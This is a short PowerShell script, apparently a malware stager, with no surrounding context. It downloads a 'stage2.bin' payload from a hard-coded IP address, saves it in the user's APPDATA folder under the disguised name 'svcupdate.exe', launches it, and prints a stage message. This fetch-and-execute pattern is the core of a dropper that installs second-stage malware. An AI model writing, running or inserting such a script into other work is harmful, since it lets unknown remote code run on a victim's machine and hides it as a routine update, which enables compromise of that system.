[CmdletBinding()]
param(
    [string]$TransferUrl = "https://192.0.2.210/stage2.bin",
    [string]$DownloadPath = "$env:APPDATA\svcupdate.exe"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath
Write-Output "stage 38 initialized"
